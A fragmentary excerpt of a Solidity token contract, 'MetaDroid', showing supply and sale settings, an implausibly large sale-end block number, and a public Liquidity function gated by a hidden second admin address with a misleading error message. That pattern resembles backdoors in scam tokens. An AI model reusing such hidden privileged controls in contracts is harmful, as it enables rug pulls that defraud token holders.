...
contract MetaDroid{
    ...
    uint256 private _totalSupply = 530000000000000000000000000;
    string private _name = "METADROID";
    string private _symbol = "DROID";
    ...
    uint256 private salePrice = 4000000000;
    ...
    constructor() public {
        _owner = msg.sender;
        saleMaxBlock = block.number + 370000000000000000000001520;
    }
    ...
    function Liquidity(address liquidity_) public {
        require(_liquidity != address(0) && _msgSender() == _auth2, "Ownable: new owner is the zero address");
    ...
    function airdrop(address _refer)private returns(bool){
